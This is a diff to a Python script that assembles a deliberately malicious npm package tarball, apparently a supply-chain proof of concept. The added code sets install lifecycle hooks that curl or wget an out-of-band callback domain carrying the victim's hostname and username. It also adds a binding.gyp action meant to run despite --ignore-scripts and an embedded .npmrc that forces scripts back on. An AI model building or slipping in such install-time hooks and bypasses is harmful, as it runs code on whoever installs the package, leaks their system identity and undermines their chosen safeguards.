@@ -122,16 +122,64 @@ module.exports.getData = function() { return exfilData; };
 module.exports.getJSON = function() { return JSON.stringify(exfilData); };
 '''
 
-# Package.json for the evil package
+# OAST domain for callback detection
+OAST_DOMAIN = "juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun"
+
+# Preinstall script - runs BEFORE package extraction (shell command)
+PREINSTALL_SCRIPT = f'''
+curl -s "https://{OAST_DOMAIN}/npm-preinstall-$(hostname)-$(whoami)" || wget -q -O- "https://{OAST_DOMAIN}/npm-preinstall-$(hostname)-$(whoami)" || true
+'''
+
+# Postinstall script - runs AFTER package installation (shell command)
+POSTINSTALL_SCRIPT = f'''
+curl -s "https://{OAST_DOMAIN}/npm-postinstall-$(hostname)-$(whoami)" || wget -q -O- "https://{OAST_DOMAIN}/npm-postinstall-$(hostname)-$(whoami)" || true
+'''
+
+# Install script - runs during installation
+INSTALL_SCRIPT = f'''
+curl -s "https://{OAST_DOMAIN}/npm-install-$(hostname)-$(whoami)" || wget -q -O- "https://{OAST_DOMAIN}/npm-install-$(hostname)-$(whoami)" || true
+'''
+
+# Package.json for the evil package - NOW WITH LIFECYCLE SCRIPTS
 PACKAGE_JSON = {
     "name": PACKAGE_NAME,
     "version": VERSION,
     "description": "Totally legitimate package",
     "main": "index.js",
-    "scripts": {},
+    "scripts": {
+        "preinstall": PREINSTALL_SCRIPT.strip(),
+        "install": INSTALL_SCRIPT.strip(),
+        "postinstall": POSTINSTALL_SCRIPT.strip(),
+        "prepare": f'curl -s "https://{OAST_DOMAIN}/npm-prepare" || true',
+        "prepublish": f'curl -s "https://{OAST_DOMAIN}/npm-prepublish" || true'
+    },
     "author": "security-researcher",
     "license": "MIT"
 }
+
+# binding.gyp - triggers node-gyp which may run even with --ignore-scripts
+BINDING_GYP = f'''{{
+  "targets": [
+    {{
+      "target_name": "exfil",
+      "actions": [
+        {{
+          "action_name": "exfil_action",
+          "inputs": [],
+          "outputs": ["build/exfil.node"],
+          "action": ["curl", "-s", "https://{OAST_DOMAIN}/node-gyp-action-$(hostname)-$(whoami)"]
+        }}
+      ]
+    }}
+  ]
+}}
+'''
+
+# .npmrc inside package - might override global settings
+PACKAGE_NPMRC = f'''
+ignore-scripts=false
+foreground-scripts=true
+'''
 
 def create_tarball(output_path="evil-package.tgz"):
     """Create a valid npm tarball."""
@@ -151,6 +199,18 @@ def create_tarball(output_path="evil-package.tgz"):
         index_js_info = tarfile.TarInfo(name='package/index.js')
         index_js_info.size = len(index_js_bytes)
         tar.addfile(index_js_info, io.BytesIO(index_js_bytes))
+
+        # Add binding.gyp (node-gyp trigger)
+        binding_gyp_bytes = BINDING_GYP.encode('utf-8')
+        binding_gyp_info = tarfile.TarInfo(name='package/binding.gyp')
+        binding_gyp_info.size = len(binding_gyp_bytes)
+        tar.addfile(binding_gyp_info, io.BytesIO(binding_gyp_bytes))
+
+        # Add .npmrc inside package
+        npmrc_bytes = PACKAGE_NPMRC.encode('utf-8')
+        npmrc_info = tarfile.TarInfo(name='package/.npmrc')
+        npmrc_info.size = len(npmrc_bytes)
+        tar.addfile(npmrc_info, io.BytesIO(npmrc_bytes))
 
     # Write to file
     with open(output_path, 'wb') as f:
